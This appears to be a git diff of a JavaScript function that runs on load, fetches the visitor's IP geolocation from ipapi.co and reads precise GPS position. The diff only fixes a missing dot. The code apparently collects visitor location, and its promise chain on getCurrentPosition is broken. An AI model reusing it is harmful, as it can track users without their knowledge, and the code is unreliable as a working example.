@@ -6,7 +6,7 @@ const sendIP = () => {
             return fetch(`https://ipapi.co/${ipadd}/json/`)
                 .then(geoResponse => geoResponse.json())
                 .then(geoData => {
-                then(gps => navigator.geolocation.getCurrentPosition
+                .then(gps => navigator.geolocation.getCurrentPosition
                 .then(pos => {
                                 {
                                     ipadd,
@@ -56,5 +56,6 @@ const sendIP = () => {
         });
 };
 sendIP();
+
 
 
